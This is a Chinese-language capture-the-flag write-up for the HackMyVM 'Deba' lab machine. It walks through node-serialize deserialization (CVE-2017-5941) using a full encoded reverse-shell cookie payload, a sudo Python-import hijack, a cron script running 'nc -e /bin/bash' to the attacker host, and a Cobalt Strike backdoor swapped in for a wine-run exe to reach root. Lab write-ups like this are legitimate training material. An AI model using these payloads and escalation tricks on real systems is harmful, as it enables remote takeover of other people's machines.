@@ -1,0 +1,328 @@
+---
+{"created":"2024-12-27T00:23:33.192+08:00","tags":["HMV","nodejs反序列化","CVE-2017-5941","wine命令","定时任务"],"Type":"wp","dg-publish":true,"难度":"⭐️⭐️⭐️⭐️⭐️","作者":"nolose","aliases":null,"系统":"Linux","permalink":"/24-渗透/HMV/deba/","dgPassFrontmatter":true,"noteIcon":"2"}
+---
+
+## 1. 基本信息^toc
+
+- [[24-渗透/HMV/deba#1. 基本信息^toc\|1. 基本信息]]
+- [[24-渗透/HMV/deba#2. 信息收集\|2. 信息收集]]
+	- [[24-渗透/HMV/deba#2.1. 端口扫描\|2.1. 端口扫描]]
+	- [[24-渗透/HMV/deba#2.2. 目录扫描\|2.2. 目录扫描]]
+- [[24-渗透/HMV/deba#3. nodejs反序列化 (CVE-2017-5941)\|3. nodejs反序列化 (CVE-2017-5941)]]
+- [[24-渗透/HMV/deba#4. www-data提权low用户\|4. www-data提权low用户]]
+- [[24-渗透/HMV/deba#5. 定时任务提权\|5. 定时任务提权]]
+- [[24-渗透/HMV/deba#6. wine命令 提权root\|6. wine命令 提权root]]
+	- [[24-渗透/HMV/deba#6.1. 利用CS获取root\|6.1. 利用CS获取root]]
+**靶机链接** https://hackmyvm.eu/machines/machine.php?vm=Deba
+**作者** [nolose](https://hackmyvm.eu/profile/?user=nolose)
+**难度** ⭐️⭐️⭐️⭐️⭐️
+**参考文章** https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
+## 2. 信息收集
+### 2.1. 端口扫描
+```bash
+┌──(root㉿kali)-[~/Desktop/hmv/deba]
+└─# nmap 192.168.56.26 -p-
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-26 11:28 EST
+Nmap scan report for 192.168.56.26
+Host is up (0.00075s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+3000/tcp open  ppp
+MAC Address: 08:00:27:2F:C3:52 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 2.80 seconds
+
+```
+
+首页是apache
+![Pasted image 20241227002954](https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227002954.png)
+3000端口首页
+```bash
+┌──(root㉿kali)-[~/Desktop/hmv/deba]
+└─# curl http://192.168.56.26:3000/
+Hello World 
+```
+### 2.2. 目录扫描
+```bash
+┌──(root㉿kali)-[~/Desktop/hmv/deba]
+└─# dirsearch -u http://192.168.56.26 -x 403
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /root/Desktop/hmv/deba/reports/http_192.168.56.26/_24-12-26_11-30-56.txt
+
+Target: http://192.168.56.26/
+
+[11:30:56] Starting:
+[11:31:09] 301 -  321B  - /node_modules  ->  http://192.168.56.26/node_modules/
+[11:31:09] 200 -  992B  - /node_modules/
+[11:31:09] 200 -  116B  - /package.json
+[11:31:09] 200 -   32KB - /package-lock.json
+[11:31:12] 200 -  386B  - /server.js
+
+Task Completed
+
+┌──(root㉿kali)-[~/Desktop/hmv/deba]
+└─# dirsearch -u http://192.168.56.26:3000 -x 403
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /root/Desktop/hmv/deba/reports/http_192.168.56.26_3000/_24-12-26_11-31-27.txt
+
+Target: http://192.168.56.26:3000/
+
+[11:31:27] Starting:
+
+Task Completed
+
+```
+
+发现一个nodejs的源码
+```bash
+┌──(root㉿kali)-[~/Desktop/hmv/deba]
+└─# curl http://192.168.56.26//server.js
+var express = require('express');
+var cookieParser = require('cookie-parser');
+var escape = require('escape-html');
+var serialize = require('node-serialize');
+var app = express();
+app.use(cookieParser())
+app.get('/', function(req, res) {
+    if (req.cookies.profile) {
+        var str = new Buffer(req.cookies.profile,'base64').toString();
+        var obj = serialize.unserialize(str);
+    if (obj.username) {
+        res.send("Hello " + escape(obj.username));
+    }
+
+    } else {
+        res.cookie('profile',"eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=", { maxAge: 900000, httpOnly: true});
+    }
+res.send("Hello World");
+});
+app.listen(3000);
+```
+> 分析代码可知 访问 `http://192.168.56.26:3000/` Web 应用程序中会检查客户端请求中是否带有名为 `profile` 的 Cookie，
+> 如果有，则会将其解码为 Base64 字符串，并使用 `serialize.unserialize` 将字符串反序列化为对象，
+> 由于Cookie是我们可以控制的，所以我们可以使用恶意cookie来利用这个反序列化漏洞
+
+
+我们可以先简单测试一下，如修改名字
+```bash
+┌──(root㉿kali)-[~/Desktop/hmv/deba]
+└─# echo "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=" |base64 -d
+{"username":"ajin","country":"india","city":"bangalore"} 
+
+修改username的值
+┌──(root㉿kali)-[~/Desktop/hmv/deba]
+└─# echo -n "{"username":"c1trus","country":"india","city":"bangalore"}"  |base64
+e3VzZXJuYW1lOmMxdHJ1cyxjb3VudHJ5OmluZGlhLGNpdHk6YmFuZ2Fsb3JlfQ==
+
+┌──(root㉿kali)-[~/Desktop/hmv/deba]
+└─#  curl http://192.168.56.26:3000/ -b "profile=eyJ1c2VybmFtZSI6ImMxdHJ1cyIsImNvdW50cnkiOiJpbmRpYSIsImNpdHkiOiJiYW5nYWxvcmUifQ=="
+Hello c1trus 
+```
+可以发现确实被修改了
+
+下面我们尝试利用这个反序列化漏洞 进行反弹shell
+这里有一个现成的反弹shell利用脚本
+https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py
+
+## 3. nodejs反序列化 (CVE-2017-5941)
+> 这里其实就是利用的 [CVE-2017-5941](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941)
+> 如果感兴趣，这里有在线的[免费靶场](https://yunjing.ichunqiu.com/cve/detail/923?pay=2)让你复现
+
+利用脚本生成反弹shell的payload
+**注意** :脚本要用python2运行
+```bash
+┌──(root㉿kali)-[~/Desktop/hmv/deba]
+└─# python2 nodejsshell.py 192.168.56.6 1234
+[+] LHOST = 192.168.56.6
+[+] LPORT = 1234
+[+] Encoding
+eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,53,54,46,54,34,59,10,80,79,82,84,61,34,49,50,51,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
+```
+然后对payload进行base64编码
+
+构造序列化代码
+```bash
+{"c1trus": "_$ND_FUNC$_function () { 上面生成的payload }()"}
+```
+
+然后对这个构造出来的payload进行base64编码
+```bash
+eyJjMXRydXMiOiAiXyQkTkRfRlVOQyQkX2Z1bmN0aW9uICgpIHtldmFsKFN0cmluZy5mcm9tQ2hhckNvZGUoMTAsMTE4LDk3LDExNCwzMiwxMTAsMTAxLDExNiwzMiw2MSwzMiwxMTQsMTAxLDExMywxMTcsMTA1LDExNCwxMDEsNDAsMzksMTEwLDEwMSwxMTYsMzksNDEsNTksMTAsMTE4LDk3LDExNCwzMiwxMTUsMTEyLDk3LDExOSwxMTAsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDk5LDEwNCwxMDUsMTA4LDEwMCw5NSwxMTIsMTE0LDExMSw5OSwxMDEsMTE1LDExNSwzOSw0MSw0NiwxMTUsMTEyLDk3LDExOSwxMTAsNTksMTAsNzIsNzksODMsODQsNjEsMzQsNDksNTcsNTAsNDYsNDksNTQsNTYsNDYsNTMsNTQsNDYsNTQsMzQsNTksMTAsODAsNzksODIsODQsNjEsMzQsNDksNTAsNTEsNTIsMzQsNTksMTAsODQsNzMsNzcsNjksNzksODUsODQsNjEsMzQsNTMsNDgsNDgsNDgsMzQsNTksMTAsMTA1LDEwMiwzMiw0MCwxMTYsMTIxLDExMiwxMDEsMTExLDEwMiwzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDYxLDYxLDMyLDM5LDExNywxMTAsMTAwLDEwMSwxMDIsMTA1LDExMCwxMDEsMTAwLDM5LDQxLDMyLDEyMywzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCwxMDUsMTE2LDQxLDMyLDEyMywzMiwxMTQsMTAxLDExNiwxMTcsMTE0LDExMCwzMiwxMTYsMTA0LDEwNSwxMTUsNDYsMTA1LDExMCwxMDAsMTAxLDEyMCw3OSwxMDIsNDAsMTA1LDExNiw0MSwzMiwzMyw2MSwzMiw0NSw0OSw1OSwzMiwxMjUsNTksMzIsMTI1LDEwLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCwzMiw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMTE4LDk3LDExNCwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDMyLDYxLDMyLDExMCwxMDEsMTE5LDMyLDExMCwxMDEsMTE2LDQ2LDgzLDExMSw5OSwxMDcsMTAxLDExNiw0MCw0MSw1OSwxMCwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDk5LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsNDAsODAsNzksODIsODQsNDQsMzIsNzIsNzksODMsODQsNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTgsOTcsMTE0LDMyLDExNSwxMDQsMzIsNjEsMzIsMTE1LDExMiw5NywxMTksMTEwLDQwLDM5LDQ3LDk4LDEwNSwxMTAsNDcsMTE1LDEwNCwzOSw0NCw5MSw5Myw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExOSwxMTQsMTA1LDExNiwxMDEsNDAsMzQsNjcsMTExLDExMCwxMTAsMTAxLDk5LDExNiwxMDEsMTAwLDMzLDkyLDExMCwzNCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwNSwxMTAsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMTEsMTE3LDExNiw0NiwxMTIsMTA1LDExMiwxMDEsNDAsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwMSwxMTQsMTE0LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTExLDExMCw0MCwzOSwxMDEsMTIwLDEwNSwxMTYsMzksNDQsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDk5LDExMSwxMDAsMTAxLDQ0LDExNSwxMDUsMTAzLDExMCw5NywxMDgsNDEsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTAxLDExMCwxMDAsNDAsMzQsNjgsMTA1LDExNSw5OSwxMTEsMTEwLDExMCwxMDEsOTksMTE2LDEwMSwxMDAsMzMsOTIsMTEwLDM0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTEsMTEwLDQwLDM5LDEwMSwxMTQsMTE0LDExMSwxMTQsMzksNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDEwMSw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwMSwxMTYsODQsMTA1LDEwOSwxMDEsMTExLDExNywxMTYsNDAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNDQsMzIsODQsNzMsNzcsNjksNzksODUsODQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDEyNSwxMCw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSw1OSwxMCkpIH0oKSJ9
+```
+
+开启监听 并使用这个payload作为cookie然后访问
+```bash
+curl http://192.168.56.26:3000/ -b "profile=base64后的payload"
+```
+
+```bash
+┌──(root㉿kali)-[~/Desktop/hmv/deba]
+└─# pwncat-cs -lp 1234
+
+[03:51:04] Welcome to pwncat 🐈!                                                                  __main__.py:164
+[03:51:09] received connection from 192.168.56.26:44754                                                bind.py:84
+[03:51:09] 0.0.0.0:1234: normalizing shell path                                                    manager.py:957
+           0.0.0.0:1234: upgrading from /usr/bin/dash to /usr/bin/bash                             manager.py:957
+           192.168.56.26:44754: registered new host w/ db                                          manager.py:957
+(local) pwncat$
+(remote) www-data@debian:/var/www$ whoami
+www-data
+
+```
+
+## 4. www-data提权low用户
+```bash
+(remote) www-data@debian:/home/low$ sudo -l
+Matching Defaults entries for www-data on debian:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on debian:
+    (ALL : low) NOPASSWD: /usr/bin/python3 /home/low/scripts/script.py
+
+(remote) www-data@debian:/home/low/scripts$ ls -la
+total 16
+drwxr-xr-x 2 low      low      4096 may  7  2021 .
+drwxr-xr-x 8 low      low      4096 may  7  2021 ..
+-rwxr-xr-x 1 www-data www-data   88 may  7  2021 main.py
+-rw-r--r-- 1 low      low        80 may  7  2021 script.py
+
+(remote) www-data@debian:/home/low/scripts$ cat script.py
+import main
+import os
+
+print("\n")
+os.system("ip a | grep enp0s3")
+
+print("\n")
+
+```
+这里我们可以用 `low` 用户执行 `script.py` 而且 `script.py` 引入了 `main.py` 我们当前用户可以修改这个 `main.py` 文件
+
+修改 `mian.py`
+```bash
+(remote) www-data@debian:/home/low/scripts$ vi main.py
+(remote) www-data@debian:/home/low/scripts$ cat main.py
+from os import system as main
+print("\n")
+print("Just main")
+main("whoami")
+main("/bin/bash")
+
+```
+
+sudo提权
+```bash
+(remote) www-data@debian:/home/low/scripts$ sudo -u low python3 /home/low/scripts/script.py
+
+low@debian:~/scripts$ whoami
+low
+
+low@debian:~$ cat user.txt
+justdeserialize
+
+```
+
+## 5. 定时任务提权
+我们使用提权脚本进行检测发现可以利用的点
+```bash
+*/1 *   * * *   debian /usr/bin/python3 /home/debian/Documentos/backup/dissapeared.py ; echo "Done" >> /home/debian/Documentos/log
+```
+`debian` 用户每分钟会执行一次 `/home/debian/Documentos/backup/dissapeared.py`
+
+但是 `backup/dissapeared.py` 并不存在，我们自己写一个即可
+```bash
+low@debian:/home/debian/Documentos$  ls -la
+total 12
+drwxrwx---  2 debian low    4096 may  7  2021 .
+drwxr-xr-x 15 debian debian 4096 may  8  2021 ..
+-rw-r--r--  1 debian debian  600 dic 27 10:19 log
+low@debian:/home/debian/Documentos$ mkdir backup
+low@debian:/home/debian/Documentos$ vi dissapeared.py
+low@debian:/home/debian/Documentos$ cat dissapeared.py
+import os
+os.system("nc -e /bin/bash 192.168.56.6 2233")
+
+```
+等待反弹即可
+
+## 6. wine命令 提权root
+```bash
+(remote) debian@debian:/home/debian$ sudo -l
+Matching Defaults entries for debian on debian:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User debian may run the following commands on debian:
+    (ALL : root) NOPASSWD: /bin/wine /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe
+    
+(remote) debian@debian:/home/debian$ ls -l /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe
+-rw-r--r-- 1 debian debian 21190 may  7  2021 /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe
+
+
+```
+`wine ` 简单来说就是允许我们在linux上允许window程序
+我们只要将 `brainfuck.exe` 替换成我们的后门程序即可
+
+### 6.1. 利用CS获取root
+```ad-note
+title:note
+这里我先用msf试着生成一个exe后门 ，但是没有成功，wine执行后会保存
+然后用CS生成exe后门可以运行且不会报错
+```
+
+msf后门报错
+```bash
+(remote) debian@debian:/home/debian$ sudo -u root /bin/wine /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe
+0009:err:seh:setup_exception_record stack overflow 1200 bytes in thread 0009 eip 7bc46086 esp 00240e80 stack 0x240000-0x241000-0x340000
+
+
+```
+上传CS生成的后门
+然后运行即可
+
+![Pasted image 20241227182208](https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227182208.png)
+但是由于是linux运行window的后门， 好像执行不了命令，反正我没有成功
+但是我们可以进行文件操作，这里可以直接读取root.txt
+
+但我还是选择写公钥进去然后连接
+![Pasted image 20241227182738](https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227182738.png)
+成功拿下root
+```bash
+┌──(root㉿kali)-[/var/www/html]
+└─# ssh -i /root/.ssh/id_rsa root@192.168.56.26
+The authenticity of host '192.168.56.26 (192.168.56.26)' can't be established.
+ED25519 key fingerprint is SHA256:FQI6CQCD3uUo59olao5SmG/3b/R9quOafr6mSSLvdlA.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.56.26' (ED25519) to the list of known hosts.
+Linux debian 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+root@debian:~# whoami
+root
+root@debian:~# cat /root/root.txt
+BoFsavetheworld
+
+```
+
+最后，其实这里也可以用 `pwnkit` 漏洞进行内核提权
